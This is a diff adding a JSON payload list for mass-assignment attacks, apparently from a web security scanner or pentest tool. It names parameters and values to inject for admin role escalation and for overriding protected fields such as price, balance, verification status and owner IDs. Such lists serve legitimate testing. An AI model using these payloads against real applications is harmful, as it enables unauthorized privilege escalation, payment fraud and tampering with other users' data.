@@ -1,0 +1,39 @@
+{
+  "category": "mass_assignment",
+  "contexts": {
+    "role_escalation": {
+      "description": "Parameter names to inject for privilege escalation via mass assignment",
+      "payloads": [
+        {"payload": "role", "description": "Generic role field — try values: admin, administrator, superadmin", "waf_bypass": false},
+        {"payload": "admin", "description": "Boolean admin flag — try values: true, 1, yes", "waf_bypass": false},
+        {"payload": "is_admin", "description": "Snake-case admin flag", "waf_bypass": false},
+        {"payload": "isAdmin", "description": "CamelCase admin flag", "waf_bypass": false},
+        {"payload": "user_type", "description": "User type field — try values: admin, staff, internal", "waf_bypass": false},
+        {"payload": "permissions", "description": "Permissions array/field — try values: [\"admin\"], all, *", "waf_bypass": false},
+        {"payload": "group", "description": "Group field — try values: admin, administrators, staff", "waf_bypass": false},
+        {"payload": "group_id", "description": "Group ID field — try values: 1, 0 (often admin)", "waf_bypass": false},
+        {"payload": "role_id", "description": "Role ID field — try values: 1, 0", "waf_bypass": false},
+        {"payload": "access_level", "description": "Access level field — try values: 999, admin, full", "waf_bypass": false},
+        {"payload": "privilege", "description": "Privilege field — try values: admin, elevated, root", "waf_bypass": false},
+        {"payload": "scope", "description": "Scope field (OAuth/API) — try values: admin, write, *, openid admin", "waf_bypass": false}
+      ]
+    },
+    "field_override": {
+      "description": "Parameter names to inject for overriding protected fields (price, verification, ownership)",
+      "payloads": [
+        {"payload": "verified", "description": "Email/phone verification bypass — try values: true, 1", "waf_bypass": false},
+        {"payload": "email_verified", "description": "Email verification status override", "waf_bypass": false},
+        {"payload": "active", "description": "Account activation bypass — try values: true, 1", "waf_bypass": false},
+        {"payload": "approved", "description": "Approval status override", "waf_bypass": false},
+        {"payload": "price", "description": "Price override — try values: 0, 0.01, 1", "waf_bypass": false},
+        {"payload": "discount", "description": "Discount override — try values: 100, 99.99", "waf_bypass": false},
+        {"payload": "amount", "description": "Amount override — try values: 0, 0.01", "waf_bypass": false},
+        {"payload": "balance", "description": "Balance override — try values: 999999", "waf_bypass": false},
+        {"payload": "user_id", "description": "Ownership reassignment — try another user's ID", "waf_bypass": false},
+        {"payload": "owner_id", "description": "Owner ID override for IDOR via mass assignment", "waf_bypass": false},
+        {"payload": "created_at", "description": "Timestamp manipulation — try past/future dates", "waf_bypass": false},
+        {"payload": "status", "description": "Status override — try values: active, confirmed, paid, shipped", "waf_bypass": false}
+      ]
+    }
+  }
+}
